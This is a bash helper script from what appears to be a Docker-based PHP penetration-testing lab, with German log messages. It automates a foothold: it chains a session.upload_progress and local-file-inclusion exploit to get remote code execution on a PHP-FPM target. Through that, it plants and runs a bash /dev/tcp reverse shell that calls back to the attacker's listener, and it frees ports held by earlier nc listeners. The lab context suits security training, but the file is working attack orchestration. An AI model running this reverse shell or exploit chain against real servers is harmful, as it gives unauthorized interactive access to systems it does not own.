# shellcheck shell=bash
# Lab foothold: Chain-A RCE (upload_progress + LFI) on the FPM target → reverse shell
# back to the engage listener. Uses bash /dev/tcp (no nc on target) or python fallback.
# Runs attacker one-shot on the target's actual Docker network.

engage_lab_foothold_container() {
  printf '%s' "${ENGAGE_LAB_TARGET_CONTAINER:-vtbw-php2shell-target}"
}

engage_lab_foothold_attacker_image() {
  printf '%s' "${ENGAGE_LAB_ATTACKER_IMAGE:-php2shell-unchained-attacker:latest}"
}

# Free a listen port held by an earlier engage listener (nc or engage-listen.py).
engage_reclaim_listen_port() {
  local port="$1" pid comm args
  [[ "$port" =~ ^[0-9]+$ ]] || return 0
  while read -r pid; do
    [[ -z "$pid" ]] && continue
    comm="$(ps -p "$pid" -o comm= 2>/dev/null || true)"
    args="$(ps -p "$pid" -o args= 2>/dev/null || true)"
    case "$comm" in
      nc|ncat|netcat) kill "$pid" 2>/dev/null || true ;;
      python|python3)
        [[ "$args" == *engage-listen.py* ]] && kill "$pid" 2>/dev/null || true
        ;;
    esac
  done < <(ss -H -tlnp "sport = :$port" 2>/dev/null | grep -oE 'pid=[0-9]+' | cut -d= -f2 | sort -u)
  sleep 0.3
}

engage_port_busy() {
  ss -H -tln "sport = :$1" 2>/dev/null | grep -q .
}

# Prints a free port, starting at $1. Kills stale engage listeners first.
engage_claim_listen_port() {
  local base="$1" p i
  for i in $(seq 0 15); do
    p=$((base + i))
    engage_reclaim_listen_port "$p"
    if ! engage_port_busy "$p"; then
      printf '%s' "$p"
      return 0
    fi
  done
  echo "[foothold] kein freier Port ab $base" >&2
  return 1
}

engage_lab_foothold_supported() {
  command -v docker >/dev/null 2>&1 || return 1
  local c; c="$(engage_lab_foothold_container)"
  docker ps --format '{{.Names}}' | grep -qx "$c" || return 1
  engage_target_is_lab
}

engage_lab_foothold_exec_rce() {
  local lhost="$1" lport="$2"
  local c; c="$(engage_lab_foothold_container)"
  # shellcheck source=scripts/lib/compose-networks.sh
  source "$LAB_ROOT/scripts/lib/compose-networks.sh"
  local net; net="$(p2s_target_network)"
  [[ -z "$net" ]] && { echo "[foothold-lab] FEHLER: target-Netz nicht gefunden" >&2; return 1; }
  local img; img="$(engage_lab_foothold_attacker_image)"
  docker image inspect "$img" >/dev/null 2>&1 || { echo "[foothold-lab] FEHLER: Image $img fehlt — vtbw-php2shell-lab up" >&2; return 1; }

  # Use bash /dev/tcp reverse shell (nc is not installed in the php-fpm image).
  local script="/tmp/p2s-foothold-$$.sh"
  # Background: PHP system() must return; the shell stays on the socket.
  docker exec "$c" bash -c "printf '%s\n' 'setsid bash -c \"bash -i >& /dev/tcp/${lhost}/${lport} 0>&1\" </dev/null >/tmp/p2s-rs.log 2>&1 &' > '$script' && chmod 755 '$script'" || return 1
  echo "[foothold-lab] RCE one-shot auf Netz: $net (Image: $img)"
  docker run --rm --network "$net" \
    -v "$LAB_ROOT/attacker/scripts:/opt/lab/scripts:ro" \
    "$img" \
    python3 /opt/lab/scripts/chain_a_session_lfi.py -t target -p 80 \
      -c "sh $script" 2>&1
}

engage_lab_foothold_note() {
  cat <<'NOTE'
[foothold-lab] RCE-Kette (session.upload_progress + LFI) → Ziel führt bash /dev/tcp Reverse-Shell aus.
  Erwartung: Fenster **listener** im tmux zeigt connect + Prompt (www-data).
  Kein Connect: Prüfe `docker logs vtbw-php2shell-target` nach dem RCE-Lauf.
NOTE
}
